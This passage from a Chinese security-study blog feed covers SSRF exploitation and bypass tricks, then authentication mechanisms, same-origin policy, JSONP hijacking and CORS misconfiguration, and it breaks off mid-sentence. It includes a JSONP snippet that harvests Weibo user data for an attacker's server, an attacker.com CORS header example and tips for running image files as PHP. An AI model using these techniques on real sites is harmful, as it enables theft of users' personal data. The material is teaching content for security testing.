利用</h2><ol><li>攻击内网进行扫描，识别服务器指纹并攻击</li><li>对主机进行端口扫描</li><li>运行主机内程序</li><li>读取内网信息（file协议）</li></ol><p>需要注意的是，<strong>回显是能否成功利用的重要的条件</strong>，在某些场景协议限定为HTTP模式且没有回显，利用<br />会相对复杂了。</p><h3 id="协议利用"><a class="markdownIt-Anchor" href="#协议利用"></a> 协议利用</h3><ul><li>DICT：除了泄露安装软件版本信息，还可以查看端口，**操作内网redis服务（只能一条指令一条指令地发送）**等</li><li>File：读取文件</li><li>Gopher：万能协议（利用Gopher攻击Redis、攻击Fastcgi 等</li><li>FTP(S)/SMB(S)：匿名访问及爆破</li><li>Tftp：UDP协议 发送UDP数据包</li><li>Telnet：SSH/Telnet匿名访问及爆破</li></ul><h3 id="漏洞利用小技巧"><a class="markdownIt-Anchor" href="#漏洞利用小技巧"></a> 漏洞利用小技巧</h3><p>crontab -l 显示当前计划任务</p><p>crontab -r 清除当前计划任务</p><p>端口转发工具 socat</p><p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行 AddType application/x-httpd-php</p><h2 id="防御-2"><a class="markdownIt-Anchor" href="#防御-2"></a> 防御</h2><ol><li>统一错误信息</li><li><strong>协议限制：http &amp;&amp; https</strong></li><li>内网IP限制</li><li>域名限制<ol><li>需要一直解析到IP为止</li><li><strong>URL白名单</strong></li></ol></li><li>正则匹配</li><li><strong>禁止30x跳转</strong></li></ol><h2 id="绕过-2"><a class="markdownIt-Anchor" href="#绕过-2"></a> 绕过</h2><ol><li>数字IP（十进制IP等等）</li><li><code>?@#</code>特殊符号绕过：<code>www.baidu.com?www.me.com</code>、<code>www.a.com@10.10.10.1</code></li><li>子域名绕过</li><li>跳转IP（中转IP）</li><li>DNS重绑定（例如短地址）</li><li>指向任意IP的域名：<a href="http://xip.io">xip.io</a></li></ol><h2 id="常见ssrf漏洞"><a class="markdownIt-Anchor" href="#常见ssrf漏洞"></a> 常见SSRF漏洞</h2><ol><li><p>Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf</p></li><li><p>discuz! 的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换）</p></li><li><p>weblogic的ssrf</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;csrf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#csrf&quot;&gt;&lt;/a&gt; CSRF&lt;/h1&gt;
&lt;h2 id=&quot;概念以及原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念以及原理&quot;&gt;&lt;/a&gt; 概念以及</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="CSRF" scheme="https://j3f5.github.io/tags/CSRF/"/>
    
    <category term="SSRF" scheme="https://j3f5.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>授权与跨域共享</title>
    <link href="https://j3f5.github.io/articles/2023/05/31/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/"/>
    <id>https://j3f5.github.io/articles/2023/05/31/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/</id>
    <published>2023-05-31T02:02:30.000Z</published>
    <updated>2023-05-31T02:02:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="认证-授权与凭证的概念"><a class="markdownIt-Anchor" href="#认证-授权与凭证的概念"></a> 认证、授权与凭证的概念</h1><p><strong>认证</strong>：<strong>验证当前用户的身份</strong>。例如有一个登陆窗口，只有输入正确的账号密码就算认证成功。</p><p><strong>授权</strong>：<strong>用户授予第三方应用访问该用户某些资源的权限</strong>。例如有一个模特，经过一些协定，这模特把自己的肖像权授予商家使用。</p><p><strong>凭证</strong>：<strong>实现认证和授权的前提</strong>是需要一种<strong>媒介（证书）</strong>。例如认证中的账号密码，例如授权中的协定。</p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/image-20230531110524628.png" alt="image-20230531110524628" style="zoom:67%;" /><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/image-20230531124840390.png" alt="image-20230531124840390" style="zoom:80%;" /><h2 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> COOKIE</h2><p><strong>HTTP 是无状态的协议（对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息</strong>）。服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。</p><p><strong>cookie 存储在客户端：</strong> cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</p><p><strong>cookie 是不可跨域的：</strong> 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，<strong>一级域名和二级域名之间是允许共享使用的</strong>（<strong>靠的是 domain）</strong>。</p><p>重要属性：</p><table><thead><tr><th><strong>httpOnly</strong></th><th><strong>如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本 读取到该 cookie 的信息，但还是能通过 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全</strong></th></tr></thead></table><h2 id="session"><a class="markdownIt-Anchor" href="#session"></a> SESSION</h2><ul><li><strong>session 是另一种记录服务器和客户端会话状态的机制</strong></li><li><strong>session 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中</strong></li></ul><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/16f523a04d0b3cf5tplv-t2oaga2asx-zoom-in-crop-mark3024000.awebp" alt="session.png" style="zoom:67%;" /><ul><li>session 认证流程：<ul><li>用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session</li><li>请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器</li><li>浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名</li><li>当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。</li></ul></li></ul><p>根据以上流程可知，<strong>SessionID 是连接 Cookie 和 Session 的一道桥梁</strong>，大部分系统也是根据此原理来验证用户登录状态。<strong>由于关闭浏览器不会导致 session 被删除，迫使服务器为 session 设置了一个失效时间，当距离客户端上一次使用 session 的时间超过这个失效时间时，服务器就认为客户端已经停止了活动，才会把 session 删除以节省存储空间。</strong></p><h2 id="token"><a class="markdownIt-Anchor" href="#token"></a> TOKEN</h2><ul><li><strong>访问资源接口（API）时所需要的资源凭证</strong></li><li><strong>简单 token 的组成：</strong> uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）</li><li>特点：<ul><li><strong>服务端无状态化、可扩展性好</strong></li><li><strong>支持移动端设备</strong></li><li>安全</li><li>支持跨程序调用</li></ul></li><li><strong>token 的身份验证流程：</strong></li></ul><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/16f523a04d9c745ftplv-t2oaga2asx-zoom-in-crop-mark3024000.awebp" alt="img" style="zoom:80%;" /><ol><li>客户端使用用户名跟密码请求登录</li><li>服务端收到请求，去验证用户名与密码</li><li>验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端</li><li>客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的 token</li><li>服务端收到请求，然后去验证客户端请求里面带着的 token ，如果验证成功，就向客户端返回请求的数据</li></ol><p><strong>特点：</strong></p><ul><li><strong>每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里</strong></li><li><strong>基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库</strong></li><li><strong>token 完全由应用管理，所以它可以避开同源策略</strong></li></ul><h2 id="jwt"><a class="markdownIt-Anchor" href="#jwt"></a> JWT</h2><p>JSON Web Token（简称 JWT）是目前最流行的<strong>跨域认证</strong>解决方案。</p><p>是一种<strong>认证授权机制</strong>。</p><p>JWT 是为了在网络应用环境间<strong>传递声明</strong>而执行的一种基于 JSON 的开放标准（<a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc7519">RFC 7519</a>）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。</p><p>可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。</p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/16f523a04e881087tplv-t2oaga2asx-zoom-in-crop-mark3024000.awebp" alt="img" style="zoom:80%;" /><p><strong>JWT 认证流程</strong>：</p><ul><li><p>用户输入用户名/密码登录，服务端认证成功后，会返回给客户端一个 JWT</p></li><li><p>客户端将 token 保存到本地（通常使用 localstorage，也可以使用 cookie）</p></li><li><p>当用户希望访问一个受保护的路由或者资源的时候，需要请求头的 Authorization 字段中使用Bearer 模式添加 JWT，其内容看起来是下面这样<code>Authorization: Bearer &lt;token&gt;</code></p></li><li><p>服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为</p></li><li><p>因为 JWT 是自包含的（内部包含了一些会话信息），因此减少了需要查询数据库的需要</p></li><li><p>因为 JWT 并不使用 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）</p></li><li><p>因为用户的状态不再存储在服务端的内存中，所以这是一种无状态的认证机制</p></li></ul><p><strong>JWT 的使用方式</strong></p><p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p><ul><li><p>方式一</p><ul><li><p>当用户希望访问一个受保护的路由或者资源的时候，可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求头信息的 Authorization 字段里，使用 Bearer 模式添加 JWT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /calendar/v1/events</span><br><span class="line">Host: api.example.com</span><br><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><ul><li>用户的状态不会存储在服务端的内存中，这是一种 <strong>无状态的认证机制</strong></li><li>服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为。</li><li>由于 JWT 是自包含的，因此减少了需要查询数据库的需要</li><li>JWT 的这些特性使得我们可以完全依赖其无状态的特性提供数据 API 服务，甚至是创建一个下载流服务。</li><li>因为 JWT 并不使用 Cookie ，所以你可以使用任何域名提供你的 API 服务而<strong>不需要担心跨域资源共享问题</strong>（CORS）</li></ul></li></ul></li><li><p>方式二</p><ul><li>跨域的时候，可以把 JWT 放在 POST 请求的数据体里。</li></ul></li><li><p>方式三</p><ul><li>通过 URL 传输：<a href="http://www.example.com/user?token=xxx">http://www.example.com/user?token=xxx</a></li></ul></li></ul><h2 id="常见的前后端鉴权方式"><a class="markdownIt-Anchor" href="#常见的前后端鉴权方式"></a> 常见的前后端鉴权方式</h2><ol><li>Session-Cookie</li><li>Token 验证（包括 JWT，SSO单点登录认证）</li><li>OAuth2.0（开放授权）</li></ol><h2 id="cookie-session和token的对比"><a class="markdownIt-Anchor" href="#cookie-session和token的对比"></a> Cookie 、Session和Token的对比</h2><table><thead><tr><th>属性</th><th>Cookie</th><th>Session</th><th>Token（JWT）</th></tr></thead><tbody><tr><td>安全性</td><td>差</td><td>-</td><td>好（不会有CORS劫持）</td></tr><tr><td>存储方式</td><td>由浏览器存储</td><td>由服务器存储</td><td>由应用管理</td></tr><tr><td>存储大小</td><td>小（且时间长）</td><td>理论无限大（时间短）</td><td>-</td></tr><tr><td>功能差异</td><td>1. 移动端支持差；2. <strong>无法跨域</strong></td><td>-</td><td>1. 移动端支持好</td></tr><tr><td>实现方式</td><td>存储与比对，<strong>会存储会话信息</strong></td><td>存储与比对，<strong>会存储会话信息</strong></td><td>直接解析比对，不依赖cookie，<strong>不会存储会话信息</strong></td></tr></tbody></table><h1 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h1><p>所谓的同源就是：<strong>协议+主机（域名）+端口</strong>都相同，一般来说，主机协议不一样，那么端口就不一样，就像http 80 https 443一样。</p><p>主要用来防止跨源操作，例如，读和写。</p><p>但是我们有时候需要引入外部资源，这个同源一棒子全部打死，咋办？</p><p>这时候有两种解决方式一个是JSONP，一个是CORS：</p><ol><li><p>一个是通过src标签属性来绕过检查</p></li><li><p>一个是通过双方验证允许的列表，来保证导入的数据是好的</p></li></ol><p>他们分别会导致不同的劫持。</p><p>同源判断示例：URL地址 <code>http://www.example.com/dir/page.html</code></p><table><thead><tr><th>Compared URL</th><th>Outcome</th><th>Reason</th></tr></thead><tbody><tr><td><a href="http://www.example.com/dir/page2.html">http://www.example.com/dir/page2.html</a></td><td>Success</td><td>Same protocol, host and port</td></tr><tr><td><a href="http://www.example.com/dir2/other.html">http://www.example.com/dir2/other.html</a></td><td>Success</td><td>Same protocol, host and port</td></tr><tr><td><a href="http://domain-ip/dir/page2.html">http://domain-ip/dir/page2.html</a></td><td>Failure</td><td>Different host (exact match required)</td></tr><tr><td><a href="http://username:password@www.example.com/dir2/other.html">http://username:password@www.example.com/dir2/other.html</a></td><td>Success</td><td>Same protocol, host and port</td></tr><tr><td><a href="http://www.example.com:81/dir/other.html">http://www.example.com:81/dir/other.html</a></td><td>Failure</td><td>Same protocol and host but different port</td></tr><tr><td><a href="https://www.example.com/dir/other.html">https://www.example.com/dir/other.html</a></td><td>Failure</td><td>Different protocol</td></tr><tr><td><a href="http://en.example.com/dir/other.html">http://en.example.com/dir/other.html</a></td><td>Failure</td><td>Different host</td></tr><tr><td><a href="http://example.com/dir/other.html">http://example.com/dir/other.html</a></td><td>Failure</td><td>Different host (exact match required)</td></tr><tr><td><a href="http://v2.www.example.com/dir/other.html">http://v2.www.example.com/dir/other.html</a></td><td>Failure</td><td>Different host (exact match required)</td></tr><tr><td><a href="http://www.example.com/dir/other.html">http://www.example.com:80/dir/other.html</a></td><td>Depends</td><td>Port explicit. Depends on implementation in browser</td></tr></tbody></table><h1 id="jsonp填充式-json"><a class="markdownIt-Anchor" href="#jsonp填充式-json"></a> JSONP——填充式 JSON</h1><p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。JSONP实现跨域请求的原理简单的说，就是动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的src 不受同源策略约束来跨域获取数据。<strong>JSONP</strong> 就是为了跨域<strong>获取资源</strong>而产生的一种<strong>非官方</strong>的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性。</p><p>JSONP 由两部分组成：<strong>回调函数</strong>和<strong>数据</strong>。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><p>动态创建<code>&lt;script&gt;</code>标签，设置其src，回调函数在src中设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var script = document.createElement(&quot;script&quot;);</span><br><span class="line">script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;</span><br><span class="line">document.body.insertBefore(script, document.body.firstChild);</span><br></pre></td></tr></table></figure><p>在页面中，返回的JSON作为response参数传入回调函数中，我们通过回调函数来来操作数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function handleResponse(response)&#123;</span><br><span class="line">    // 对response数据进行操作代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="劫持"><a class="markdownIt-Anchor" href="#劫持"></a> 劫持</h2><p>那么<strong>劫持</strong>又是怎么回事呢？其实我们在学安全的过程中对劫持这个词可以说是一点也不陌生，我们遇到过很多的劫持的攻击方法，比如：dns 劫持、点击劫持、cookie劫持等等，也正如劫持这个词的含义：“拦截挟持”，dns 劫持就是把 dns 的解析截获然后篡改，点击劫持就是截获你的鼠标的点击动作，在用户不知情的情况下点击攻击者指定的东西，cookie 劫持就是获取用户的 cookie，然后可以进一步伪造身份，那么同样， jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据。</p><h2 id="劫持利用过程"><a class="markdownIt-Anchor" href="#劫持利用过程"></a> 劫持利用过程</h2><p>通过JSONP技术可以实现数据的跨域访问，必然会产生安全问题。</p><blockquote><p>如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞能够获取用户在网站B上的数据。</p></blockquote><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/image-20230531102902509.png" alt="image-20230531102902509" style="zoom: 80%;" /><ol><li>用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；</li><li>用户通过浏览器向网站A发出URL请求；</li><li>网站<strong>A向用户返回响应页面</strong>，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    alert(result.name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；</li><li>网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)。</span><br></pre></td></tr></table></figure><ol start="6"><li>网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</li></ol><p><strong>实例：</strong></p><p>攻击者通过巧妙设计一个网站，<strong>网站中包含其他网站的JSONP漏洞利用代码</strong>，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p><h2 id="挖掘思路"><a class="markdownIt-Anchor" href="#挖掘思路"></a> 挖掘思路</h2><p>这里我采用chrome浏览器的调试窗口进行挖掘weibo.com中存在的漏洞(测试之前需要登录一下，因为我们需要检测是不是会有敏感信息泄露)</p><p>首先把Preserve log选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%952.png" alt="此处输入图片的描述" /></p><p>然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp email</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%953.png" alt="此处输入图片的描述" /></p><p>然后我们需要人工确认这个请求的返回值是否有泄露用户的敏感信息，并且能被不同的域的页面去请求获取，这里以上面查找到的 jsonp 为例，发现换成了别的浏览器还是能检测到，说明验证的来源有些问题</p><h2 id="自动化查找"><a class="markdownIt-Anchor" href="#自动化查找"></a> 自动化查找</h2><p>自动化测试工具Selenium + Proxy + 验证脚本</p><ol><li>Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；</li><li>Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求；</li><li>验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><p>JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作(<a href="https://www.freebuf.com/articles/web/70025.html">水坑攻击</a>)，下面的一个例子就可以说是在模拟水坑攻击</p><p>当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;,</span><br><span class="line">    type: &#x27;get&#x27;,</span><br><span class="line">    dataType: &#x27;jsonp&#x27;,</span><br><span class="line">&#125;).done(function(json)&#123;</span><br><span class="line">    var id = json[&quot;data&quot;][&quot;id&quot;];</span><br><span class="line">    var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;];</span><br><span class="line">    var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;];</span><br><span class="line"></span><br><span class="line">    var post_data = &quot;&quot;;</span><br><span class="line">    post_data += &quot;id=&quot; + id + &quot;&amp;amp;&quot;;</span><br><span class="line">    post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;amp;&quot;;</span><br><span class="line">    post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url);</span><br><span class="line">    console.log(post_data);</span><br><span class="line">    // 发送到我的服务器上</span><br><span class="line">&#125;).fail(function() &#123;&#125;);</span><br></pre></td></tr></table></figure><p>利用代码：<a href="https://github.com/qiaofei32/jsonp_info_leak">https://github.com/qiaofei32/jsonp_info_leak</a></p><h2 id="防护"><a class="markdownIt-Anchor" href="#防护"></a> 防护</h2><ol><li>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。</li><li>严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。</li><li>严格过滤 callback 函数名及 JSON 里数据的输出。</li><li>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。</li><li>其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</li></ol><h1 id="cors跨来源资源共享"><a class="markdownIt-Anchor" href="#cors跨来源资源共享"></a> CORS——跨来源资源共享</h1><p>CORS（Cross-Origin Resource Sharing 跨来源资源共享），CORS允许浏览器向跨域服务器发出XmlHttpRequest请求，CORS与JSONP的区别：是JSONP的升级版，JSONP只能通过get方式请求，CORS支持get和post请求。</p><p>CORS跨域原理：向header中注入Access-Control-Allow-Origin服务端过判断请求头中的参数是否被允许的域来决定请求源是否有权限获取数据。如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p><h2 id="字段"><a class="markdownIt-Anchor" href="#字段"></a> 字段</h2><ol><li><p>Access-Control-Allow-Origin：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大；</p></li><li><p>Access-Control-Allow-Credentials</p><p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略， 只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p></li></ol><h2 id="简单流程"><a class="markdownIt-Anchor" href="#简单流程"></a> 简单流程</h2><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/1646812634466-fbf45f2a-b577-47b3-a809-cf238b1ff447.png" alt="img" /></p><p>这个响应头表示访问允许，*符号表示所有的请求源的所有形式的请求，都被允许访问数据，这样也就造成了一个跨域读取敏感信息的漏洞。</p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/bVbEgb2.png" alt="image.png" /></p><p><img src="/images/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/bVbEgce.png" alt="image.png" /></p><p>改为百度成功,假如我改成自己服务器上的话,是不是在本机就能读取到别人的敏感信息呢?</p><h2 id="如何快速判断是否存在cors漏洞"><a class="markdownIt-Anchor" href="#如何快速判断是否存在cors漏洞"></a> 如何快速判断是否存在CORS漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">最好的攻击案例：</span><br><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br><span class="line">可能存在利用点：</span><br><span class="line">Access-Control-Allow-Origin: null</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br><span class="line">配置失误，但是几乎无法利用：</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br><span class="line">或者只有一个：</span><br><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure><p><strong>修复建议：</strong><br />加强对access-control-allow-orign的控制；</p><p>另外提一下大平台很喜欢利用cors跨域读取资源，多多使用f12打法有奇效。<strong>总的来说jsonp劫持和cors跨域都是属于csrf漏洞的一种,需要诱骗受害者点击才能触发</strong>,就是返回信息的接口被攻击者调用了 返回了敏感数据给其他人。</p><h2 id="检测"><a class="markdownIt-Anchor" href="#检测"></a> 检测</h2><p>CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。</p><p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。</p><p>首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 Origin:foo.example.org 的Enable框：</p><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820689476-f7b1ce2f-d25e-4c80-bd2d-645d84710c48.png" alt="img" /></p><p>然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 